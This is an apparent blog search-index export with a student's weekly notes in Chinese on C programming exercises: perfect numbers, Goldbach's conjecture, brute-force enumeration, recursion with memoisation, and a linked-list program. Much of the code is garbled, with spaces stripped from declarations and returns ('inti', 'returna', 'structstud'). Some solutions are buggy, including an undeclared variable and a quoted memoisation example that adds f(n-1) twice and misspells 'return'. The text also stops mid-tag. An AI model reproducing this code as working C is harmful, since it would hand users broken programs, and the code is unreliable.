<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019.11.25-2019.11.30</title>
    <url>/32145.html</url>
    <content><![CDATA[<h2 id="1-PTA-寻找完美数">1.PTA-寻找完美数</h2>
<p><img src="https://img-blog.csdnimg.cn/20191129134009445.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="题目如图"></p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(inti)</span></span>&#123;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	intn=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(intk=<span class="number">2</span>;k&lt;i;k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			n=n+k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inta=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==i&amp;&amp;i!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">		a=<span class="number">1</span>;</span><br><span class="line">		returna;</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	inta,b;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">	<span class="keyword">for</span>(inti=a;i&lt;=b;i++)&#123;</span><br><span class="line">		j=judge(i);</span><br><span class="line">		<span class="keyword">if</span>(j==<span class="number">1</span>)&#123;</span><br><span class="line">			c=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(c!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是第一次提交的，结果只对了一个，其他都是格式错误，感觉应该是结尾不能有空格，就将 main 函数里的参数 c 传入 judge 函数，判断输出的是否是第一个完美数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">judge</span><span class="params">(inti,intc)</span></span>&#123;</span><br><span class="line">	intj=<span class="number">0</span>;</span><br><span class="line">	intn=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(intk=<span class="number">2</span>;k&lt;i;k++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i%k==<span class="number">0</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			n=n+k+i/k;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	inta=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==i&amp;&amp;i!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(c==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">		&#125;</span><br><span class="line">		a=<span class="number">1</span>;</span><br><span class="line">		returna;</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二次提交的时候有一个测试点没有通过，猜测是 i 太大的时候超时了，于是把 judge 函数里循环的循环条件改为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">k&lt;<span class="built_in">sqrt</span>(i)</span><br></pre></td></tr></table></figure>
<p>就通过了。</p>
<h2 id="2-PTA-验证“哥德巴赫猜想”">2.PTA-验证“哥德巴赫猜想”</h2>
<p><img src="https://img-blog.csdnimg.cn/20191129234420522.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line">intprime(intq)&#123;</span><br><span class="line">	inti=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(;i&lt;q;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(q%i==<span class="number">0</span>)&#123;</span><br><span class="line">			return0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(q==i)&#123;</span><br><span class="line">		return1;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	intm;</span><br><span class="line">	m=<span class="built_in">sqrt</span>(n)+<span class="number">1</span>;</span><br><span class="line">	inta;</span><br><span class="line">	intta1;</span><br><span class="line">	intta2;</span><br><span class="line">	<span class="keyword">for</span>(intp=<span class="number">2</span>;p&lt;n/<span class="number">2</span>;p++)&#123;</span><br><span class="line">		ta1=<span class="number">0</span>;</span><br><span class="line">		ta2=<span class="number">0</span>;</span><br><span class="line">		a=n-p;</span><br><span class="line">		<span class="keyword">if</span>(prime(p)==<span class="number">0</span>)	<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span>(prime(a)==<span class="number">0</span>)	<span class="keyword">continue</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d=%d+%d&quot;</span>,n,p,a);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次提交的时候长这样，依旧是最大 N 的时候运行超时，想了好久不知道怎么改，上网搜了一下：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0YXJpbHkvYXJ0aWNsZS9kZXRhaWxzLzc4NTU3NjQ5">7-6 验证“哥德巴赫猜想”（20 分）<i class="fa fa-external-link-alt"></i></span>得到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prime</span><span class="params">(intn)</span></span>&#123;</span><br><span class="line"><span class="comment">//判断n为偶数时</span></span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">2</span>)&#123;</span><br><span class="line">		return1;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n&lt;<span class="number">2</span>||n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//判断n为奇数时</span></span><br><span class="line">	<span class="keyword">for</span>(inti=<span class="number">3</span>;i*i&lt;=n;i=i+<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line">			return0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">4</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;4=2+2&quot;</span>);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(inti=<span class="number">2</span>;i&lt;n/<span class="number">2</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(prime(i)&amp;&amp;prime(n-i))&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d=%d+%d&quot;</span>,n,i,n-i);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3-洛谷-P2089-烤鸡">3.洛谷-P2089 烤鸡</h2>
<p><img src="https://img-blog.csdnimg.cn/201911300913530.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
只想到了这个方法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">intmain()&#123;</span><br><span class="line">	intn;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">if</span>(n&gt;<span class="number">30</span>||n&lt;<span class="number">10</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">		return0;</span><br><span class="line">	&#125;</span><br><span class="line">	intcnt=<span class="number">0</span>;</span><br><span class="line">	inta,b,c,d,e,f,g,h,i,j;</span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">1</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">		<span class="keyword">for</span>(b=<span class="number">1</span>;b&lt;=<span class="number">3</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(c=<span class="number">1</span>;c&lt;=<span class="number">3</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(d=<span class="number">1</span>;d&lt;=<span class="number">3</span>;d++)</span><br><span class="line">					<span class="keyword">for</span>(e=<span class="number">1</span>;e&lt;=<span class="number">3</span>;e++)</span><br><span class="line">						<span class="keyword">for</span>(f=<span class="number">1</span>;f&lt;=<span class="number">3</span>;f++)</span><br><span class="line">							<span class="keyword">for</span>(g=<span class="number">1</span>;g&lt;=<span class="number">3</span>;g++)</span><br><span class="line">								<span class="keyword">for</span>(h=<span class="number">1</span>;h&lt;=<span class="number">3</span>;h++)</span><br><span class="line">									<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)</span><br><span class="line">										<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">											<span class="keyword">if</span>(a+b+c+d+e+f+g+h+i+j==n)</span><br><span class="line">												cnt++;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">	<span class="keyword">for</span>(a=<span class="number">1</span>;a&lt;=<span class="number">3</span>;a++)</span><br><span class="line">		<span class="keyword">for</span>(b=<span class="number">1</span>;b&lt;=<span class="number">3</span>;b++)</span><br><span class="line">			<span class="keyword">for</span>(c=<span class="number">1</span>;c&lt;=<span class="number">3</span>;c++)</span><br><span class="line">				<span class="keyword">for</span>(d=<span class="number">1</span>;d&lt;=<span class="number">3</span>;d++)</span><br><span class="line">					<span class="keyword">for</span>(e=<span class="number">1</span>;e&lt;=<span class="number">3</span>;e++)</span><br><span class="line">						<span class="keyword">for</span>(f=<span class="number">1</span>;f&lt;=<span class="number">3</span>;f++)</span><br><span class="line">							<span class="keyword">for</span>(g=<span class="number">1</span>;g&lt;=<span class="number">3</span>;g++)</span><br><span class="line">								<span class="keyword">for</span>(h=<span class="number">1</span>;h&lt;=<span class="number">3</span>;h++)</span><br><span class="line">									<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)</span><br><span class="line">										<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">											<span class="keyword">if</span>(a+b+c+d+e+f+g+h+i+j==n)</span><br><span class="line">												<span class="built_in">printf</span>(<span class="string">&quot;%d%d%d%d%d%d%d%d%d%d\n&quot;</span>,a,b,c,d,e,f,g,h,i,j);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然通过了但是觉得这样太傻了<br>
不过别人交的题解也没看懂…<br>
感觉这个方法挺特别的：<br>
<img src="https://img-blog.csdnimg.cn/20191130094135480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="4-链表">4.链表</h2>
<p>周二在 b 站上看了个讲解单链表的教程：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2NDE4MjAzP2Zyb209c2VhcmNoJnNlaWQ9OTQ4MjU4NDI5NTEyMTk1MzEzMg==">C 语言入门教程第 13 讲动态内存分配和链表<i class="fa fa-external-link-alt"></i></span>，跟着打了两遍，看代码理解了一遍，感觉还不是很懂，就尝试自己打了一下。<br>
然后顺便把教程里没说的删除弄出来了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">structstud&#123;</span><br><span class="line">	charname[<span class="number">10</span>];</span><br><span class="line">	structstud*next;</span><br><span class="line">&#125;;</span><br><span class="line">voidprint(structstud*p);</span><br><span class="line"><span class="function">structstud*<span class="title">remove</span><span class="params">(structstud*p)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">	structstud*current,*nextp,*head;</span><br><span class="line">	head=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line">	charstr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;typeaname：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="built_in">strcpy</span>(head-&gt;name,str);</span><br><span class="line">	current=head;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	chara;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;keepdoing?\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);</span><br><span class="line">	<span class="keyword">while</span>(a==<span class="string">&#x27;y&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;typeaname：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">		getchar();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		nextp=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="built_in">strcpy</span>(nextp-&gt;name,str);</span><br><span class="line">		current-&gt;next=nextp;</span><br><span class="line">		current=nextp;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;keepdoing?\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;a);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	current-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	returnhead;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">insert</span><span class="params">(structstud*p)</span></span>&#123;</span><br><span class="line">	structstud*insert,*current;</span><br><span class="line">	intposition;</span><br><span class="line">	charstr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;insertposition:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;position);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;typeaname:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,str);</span><br><span class="line">	getchar();</span><br><span class="line"></span><br><span class="line">	current=p;</span><br><span class="line">	insert=(structstud*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(structstud));</span><br><span class="line">	<span class="built_in">strcpy</span>(insert-&gt;name,str);</span><br><span class="line"></span><br><span class="line">	insert-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span>(position!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(position&gt;<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			current=current-&gt;next;</span><br><span class="line">			position--;</span><br><span class="line">		&#125;<span class="comment">//current=insert-1;</span></span><br><span class="line">		insert-&gt;next=current-&gt;next;</span><br><span class="line">		current-&gt;next=insert;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		insert-&gt;next=current;</span><br><span class="line">		p=insert;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\npresentelement:\n&quot;</span>);</span><br><span class="line">	print(p);</span><br><span class="line">	returnp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intmain()&#123;</span><br><span class="line">	structstud*p;</span><br><span class="line">	p=build();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;presentelement:\n&quot;</span>);</span><br><span class="line">	print(p);</span><br><span class="line"></span><br><span class="line">	charb=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;insert?yorn&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(b!=<span class="string">&#x27;n&#x27;</span>)&#123;</span><br><span class="line">		p=insert(p);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;insert?yorn&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line"><span class="comment">//		getchar();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	charc;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;deleteaname?yorn&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;c);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">while</span>(c!=<span class="string">&#x27;n&#x27;</span>)&#123;</span><br><span class="line">		p=remove(p);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;deleteaname?yorn&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;c);</span><br><span class="line">		getchar();</span><br><span class="line">	&#125;</span><br><span class="line">	return0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">voidprint(structstud*p)&#123;</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p-&gt;name);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p-&gt;name);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">structstud*<span class="title">remove</span><span class="params">(structstud*p)</span></span>&#123;</span><br><span class="line">	structstud*position,*current=p;</span><br><span class="line">	intpo;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;place:&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;po);</span><br><span class="line">	<span class="keyword">if</span>(po!=<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">while</span>(po!=<span class="number">1</span>)&#123;</span><br><span class="line">			current=current-&gt;next;</span><br><span class="line">			po--;</span><br><span class="line">		&#125;</span><br><span class="line">		position=current;</span><br><span class="line">		position=position-&gt;next;</span><br><span class="line">		current-&gt;next=position-&gt;next;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		p=current-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(current);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;currentlist:\n&quot;</span>);</span><br><span class="line">	print(p);</span><br><span class="line">	returnp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.01-2019.12.07</title>
    <url>/34683.html</url>
    <content><![CDATA[<h2 id="1-洛谷-P1028-数的计算">1.洛谷-P1028 数的计算</h2>
<p><img src="https://img-blog.csdnimg.cn/2019120714254339.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<span id="more"></span>
<p>第一次写的时候大概思路：<img src="https://img-blog.csdnimg.cn/20191207142716854.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> sum;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n/<span class="number">2</span>; i++)</span><br><span class="line">		sum=sum+cal(i);</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,cal(n));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果有15个超时了。<br>
前几天看别人的题解没看懂，打算写完周报再看一下。</p>
<h2 id="2-递归优化">2.递归优化</h2>
<blockquote>
<p>有关递归的一些优化思路1. 考虑是否重复计算告诉你吧，如果你使用递归的时候不进行优化，是有非常非常非常多的子问题被重复计算的。 啥是子问题？ f(n-1),f(n-2)…就是 f(n) 的子问题了。例如对于案例2那道题，f(n) = f(n-1) + f(n-2)。递归调用的状态图如下：<img src="https://pic2.zhimg.com/v2-32f657a7a8e409a130f196fc34948291_b.jpg" data-caption="" data-size="normal" data-rawwidth="729" data-rawheight="444" data-default-watermark-src="https://pic1.zhimg.com/v2-45ac6014f7b3cf95a66b50126b80a990_b.jpg" class="origin_image zh-lightbox-thumb" width="729" data-original="https://pic2.zhimg.com/v2-32f657a7a8e409a130f196fc34948291_r.jpg"/>看到没有，递归计算的时候，重复计算了两次 f(5)，五次 f(4)。。。。这是非常恐怖的，n 越大，重复计算的就越多，所以我们必须进行优化。如何优化？一般我们可以把我们计算的结果保证起来，例如把 f(4) 的计算结果保证起来，当再次要计算 f(4) 的时候，我们先判断一下，之前是否计算过，如果计算过，直接把 f(4) 的结果取出来就可以了，没有计算过的话，再递归计算。用什么保存呢？可以用数组或者 HashMap 保存，我们用数组来保存把，把 n 作为我们的数组下标，f(n) 作为值，例如 arr[n] = f(n)。f(n) 还没有计算过的时候，我们让 arr[n] 等于一个特殊值，例如 arr[n] = -1。当我们要判断的时候，如果 arr[n] = -1，则证明 f(n) 没有计算过，否则， f(n) 就已经计算过了，且 f(n) = arr[n]。直接把值取出来就行了。代码如下：// 我们实现假定 arr 数组已经初始化好的了。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//先判断有没计算过</span></span><br><span class="line">    <span class="keyword">if</span>(arr[n] != <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="comment">//计算过，直接返回</span></span><br><span class="line">        <span class="keyword">return</span> arr[n];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 没有计算过，递归计算,并且把结果保存到 arr数组里</span></span><br><span class="line">        arr[n] = f(n<span class="number">-1</span>) + f(n<span class="number">-1</span>);</span><br><span class="line">        reutrn arr[n];</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>也就是说，使用递归的时候，必要 须要考虑有没有重复计算，如果重复计算了，一定要把计算过的状态保存起来。2. 考虑是否可以自底向上对于递归的问题，我们一般都是从上往下递归的，直到递归到最底，再一层一层着把值返回。不过，有时候当 n 比较大的时候，例如当 n = 10000 时，那么必须要往下递归10000层直到 n &lt;=1 才将结果慢慢返回，如果n太大的话，可能栈空间会不够用。对于这种情况，其实我们是可以考虑自底向上的做法的。例如我知道f(1) = 1;f(2) = 2;那么我们就可以推出 f(3) = f(2) + f(1) = 3。从而可以推出f(4),f(5)等直到f(n)。因此，我们可以考虑使用自底向上的方法来取代递归，代码如下：</p>
</blockquote>
<figure class="highlight plaintext"><figcaption><span>int f(int n) &#123;</span></figcaption><table><tr><td class="code"><pre><span class="line">public int f(int n) &#123;</span><br><span class="line">       if(n &lt;= 2)</span><br><span class="line">           return n;</span><br><span class="line">       int f1 = 1;</span><br><span class="line">       int f2 = 2;</span><br><span class="line">       int sum = 0;</span><br><span class="line">       for (int i = 3; i &lt;= n; i++) &#123;</span><br><span class="line">           sum = f1 + f2;</span><br><span class="line">           f1 = f2;</span><br><span class="line">           f2 = sum;</span><br><span class="line">       &#125;</span><br><span class="line">       return sum;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这种方法，其实也被称之为递推。<br>
作者：帅地<br>
链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMxNDEyNDM2L2Fuc3dlci82ODM4MjA3NjU=">https://www.zhihu.com/question/31412436/answer/683820765<i class="fa fa-external-link-alt"></i></span><br>
来源：知乎<br>
著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<h2 id="2-链表的查找">2.链表的查找</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct stud *p)</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stud</span> *<span class="title">p1</span>=</span>p;</span><br><span class="line">	<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;find:1.num or 2.name?   &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(num==<span class="number">1</span>) &#123;</span><br><span class="line">		<span 